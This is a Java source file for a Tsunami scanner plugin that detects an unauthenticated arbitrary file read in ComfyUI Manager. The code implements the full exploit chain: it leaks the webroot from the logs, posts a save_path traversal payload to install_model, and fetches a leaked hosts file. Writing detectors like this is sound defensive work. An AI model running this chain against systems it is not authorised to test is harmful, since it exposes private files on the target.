/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.comfyui.fileread_savepath;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.base.Optional;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.security.SecureRandom;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.util.NoSuchElementException;
import javax.inject.Inject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

/** A Tsunami plugin that detects a Pre-Auth File Read in ComfyUI. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Arbitrary File Read in ComfyUI Manager via save_path Field",
    version = "0.1",
    description = "This plugin detects an unauthenticated file read in ComfyUI Manager by abusing a path traversal on the save_path field of the install_module endpoint.",
    author = "Savino Sisco (savio@doyensec.com), Leonardo Giovannini (leonardo@doyensec.com)",
    bootstrapModule = ComfyUiFileReadViaSavePathBootStrapModule.class)
public final class ComfyUiFileReadViaSavePath implements VulnDetector {
  @VisibleForTesting static final String VULNERABILITY_REPORT_PUBLISHER = "TSUNAMI_COMMUNITY";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_TITLE = "Arbitrary File Read in ComfyUI Manager via save_path Field";

  private static final String PAYLOAD_TEMPLATE =
              "{\n" +
                      "  \"base\": \"FLUX.1\",\n" +
                      "  \"description\": \"test\",\n" +
                      "  \"filename\": \"OUTPUT_FILE\",\n" +
                      "  \"name\": \"test\",\n" +
                      "  \"reference\": \"test\",\n" +
                      "  \"save_path\": \"custom_nodes/OUTPUT_PATH\",\n" +
                      "  \"size\": \"4.71MB\",\n" +
                      "  \"type\": \"TAESD\",\n" +
                      "  \"url\": \"FILE_TO_LEAK\",\n" +
                      "  \"installed\": \"False\",\n" +
                      "  \"ui_id\": \"\"\n" +
                      "}";

  static final String VULNERABILITY_REPORT_DESCRIPTION_BASIC =
      "The scanner detected a ComfyUI instance vulnerable to arbitrary file read. The vulnerability"
          + " can be exploited by sending a sequence of unauthenticated HTTP requests that would"
          + " read the content of a file on the system and write it into the webroot path. ";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_DESCRIPTION =
      VULNERABILITY_REPORT_DESCRIPTION_BASIC
          + "The vulnerability was confirmed by leaking a file from the system.";

  @VisibleForTesting
  static final String VULNERABILITY_REPORT_RECOMMENDATION = "Update the ComfyUI instance.";

  @VisibleForTesting static final String VERSION_ENDPOINT = "api/manager/version";

  @VisibleForTesting static final String LOGS_ENDPOINT = "internal/logs/raw";

  @VisibleForTesting static final String WEBROOT_MESSAGE_PREFIX = "[Prompt Server] web root:";

  @VisibleForTesting static final String OS_ENDPOINT = "api/system_stats";

  @VisibleForTesting static final String INSTALL_MODEL_ENDPOINT = "api/manager/queue/install_model";

  @VisibleForTesting static final String QUEUE_START_ENDPOINT = "api/manager/queue/start";

  @VisibleForTesting static final String WEBROOT_SUBDIRECTORY = "assets";

  @VisibleForTesting static final String FILE_TO_LEAK_POSIX = "file:///etc/hosts";

  @VisibleForTesting static final String FILE_TO_LEAK_WIN = "file:C:\\Windows\\system32\\drivers\\etc\\hosts";

  @VisibleForTesting static final String LEAK_DETECTION_STRING = "127.0.0.1";

  @VisibleForTesting static final int OUTPUT_FILENAME_LENGTH = 16;

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private final Clock utcClock;
  private final HttpClient httpClient;

  private static String generateRandomString(int length) {
    SecureRandom random = new SecureRandom();
    StringBuilder sb = new StringBuilder(length);

    String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < length; i++) {
      int index = random.nextInt(charset.length());
      sb.append(charset.charAt(index));
    }

    return sb.toString();
  }

  @Inject
  ComfyUiFileReadViaSavePath(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  // This is the main entry point of VulnDetector.
  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("ComfyUI Pre-Auth File Read starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isComfyUi)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /*
   * Fingerprint phase for ComfyUI.
   * This detects the service and the version
   */
  private boolean isComfyUi(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    HttpRequest req =
        HttpRequest.get(targetUri)
            .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
            .build();
    HttpResponse response;
    try {
      response = this.httpClient.send(req, networkService);
      Document doc = Jsoup.parse(response.bodyString().get());
      // Checking if the service is ComfyUI
      String title = doc.title();
      if (!title.contains("ComfyUI")) {
        return false;
      }
        // Checking the version
        targetUri =
            NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VERSION_ENDPOINT;
        req =
            HttpRequest.get(targetUri)
                .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                .build();
        response = this.httpClient.send(req, networkService);

        if (response.bodyString().isPresent() && !response.bodyString().get().isBlank()) {
        logger.atInfo().log("ComfyUI Manager Version: " + response.bodyString().orElse("Unknown"));
        return true;
      } else {
          logger.atInfo().log("ComfyUI Manager not available");
          return false;
      }
    } catch (IOException e) {
      return false;
    }
  }

  private Optional<String> findFrontendWebroot(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUrl + LOGS_ENDPOINT;
    HttpRequest req =
            HttpRequest.get(targetUri)
                    .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                    .build();
    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status() != HttpStatus.OK || response.bodyJson().isEmpty()) {
        return Optional.absent();
      }

      // Find web root path from the logs
      try {
        JsonArray logs = response
                .bodyJson()
                .get()
                .getAsJsonObject()
                .get("entries")
                .getAsJsonArray();

        for (JsonElement log : logs) {
          String message = log
                  .getAsJsonObject()
                  .get("m")
                  .getAsString();

          if (message.startsWith(WEBROOT_MESSAGE_PREFIX)) {
            String webroot = message.substring(WEBROOT_MESSAGE_PREFIX.length());
            return Optional.of(webroot.strip());
          }
        }
        // Not found
        return Optional.absent();
      } catch (IllegalStateException | NoSuchElementException | NullPointerException | ClassCastException e) {
        return Optional.absent();
      }
    } catch (IOException e) {
      return Optional.absent();
    }
  }

  private Optional<String> detectHostOs(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUrl + OS_ENDPOINT;
    HttpRequest req =
            HttpRequest.get(targetUri)
                    .setHeaders(HttpHeaders.builder().addHeader("Accept", "application/json").build())
                    .build();

    try {
      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status() != HttpStatus.OK || response.bodyJson().isEmpty()) {
        return Optional.absent();
      }

      try {
        String os =
                response
                        .bodyJson()
                        .get()
                        .getAsJsonObject()
                        .get("system")
                        .getAsJsonObject()
                        .get("os")
                        .getAsString();

        return Optional.of(os);
      } catch (IllegalStateException | NoSuchElementException | NullPointerException | ClassCastException e) {
        return Optional.absent();
      }
    } catch (IOException e) {
      return Optional.absent();
    }
  }

  // Checks whether a given ComfyUI instance is exposed and vulnerable.
  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);

    // The first HTTP request is used to leak the webroot path.
    Optional<String> webrootPathOptional = this.findFrontendWebroot(networkService);
    if (!webrootPathOptional.isPresent()) {
      logger.atWarning().log("Could not identify frontend web root path");
      return false;
    }
    String webroot = webrootPathOptional.get();

    // The second HTTP request is used in order to detect the OS.
    Optional<String> hostOsOptional = this.detectHostOs(networkService);
    if (!hostOsOptional.isPresent()) {
      logger.atWarning().log("Could not identify host OS");
      return false;
    }
    String os = hostOsOptional.get();

    String outputFilename = ComfyUiFileReadViaSavePath.generateRandomString(OUTPUT_FILENAME_LENGTH) + ".safetensors";

    String fileUri;
    String outputPath;

    if (os.equals("posix")) {
      fileUri = FILE_TO_LEAK_POSIX;
      outputPath = webroot + "/" + WEBROOT_SUBDIRECTORY;
    } else if (os.equals("nt")) {
      fileUri = FILE_TO_LEAK_WIN.replace("\\", "\\\\");
      outputPath = webroot + "\\" + WEBROOT_SUBDIRECTORY;
      outputPath = outputPath.replace("\\", "\\\\");
    } else {
      logger.atWarning().log("Could not identify host OS");
      return false;
    }

    String payload =
            PAYLOAD_TEMPLATE
                    .replace("OUTPUT_PATH", outputPath)
                    .replace("OUTPUT_FILE", outputFilename)
                    .replace("FILE_TO_LEAK", fileUri);

    try {
      // The third HTTP request is used to create the task and enqueue it
      String targetUri = rootUrl + INSTALL_MODEL_ENDPOINT;
      logger.atInfo().log("Sending payload:", payload);

      HttpRequest req =
          HttpRequest.post(targetUri)
              .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
              .setRequestBody(ByteString.copyFromUtf8(payload))
              .build();

      HttpResponse response = this.httpClient.send(req, networkService);
      if (response.status() != HttpStatus.OK) {
        logger.atWarning().log("Unexpected response to install model request: " + response.status());
        return false;
      }

      // The fourth HTTP request is used to start the queue execution
      targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + QUEUE_START_ENDPOINT;
      req = HttpRequest.get(targetUri).withEmptyHeaders().build();
      response = this.httpClient.send(req, networkService);

      if (response.status() != HttpStatus.OK) {
        logger.atWarning().log("Unexpected response to queue start request: " + response.status());
        return false;
      }

      // Sleep to allow the task to execute
      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(1));

      // Leak the file
      targetUri = rootUrl + WEBROOT_SUBDIRECTORY + "/" + outputFilename;
      logger.atInfo().log("Leaking file from URL: " + targetUri);
      req = HttpRequest.get(targetUri).withEmptyHeaders().build();
      response = this.httpClient.send(req, networkService);

      if (response.bodyString().orElse("").contains(LEAK_DETECTION_STRING)) {
        logger.atInfo().log("File leak confirmed");
        return true;
      } else {
        return false;
      }

    } catch (IOException | IllegalStateException e) {
      logger.atWarning().withCause(e).log("Exception raised during detection.");
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {

    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher(VULNERABILITY_REPORT_PUBLISHER))
                .setSeverity(Severity.CRITICAL)
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULNERABILITY_REPORT_DESCRIPTION)
                .setRecommendation(VULNERABILITY_REPORT_RECOMMENDATION))
        .build();
  }
}
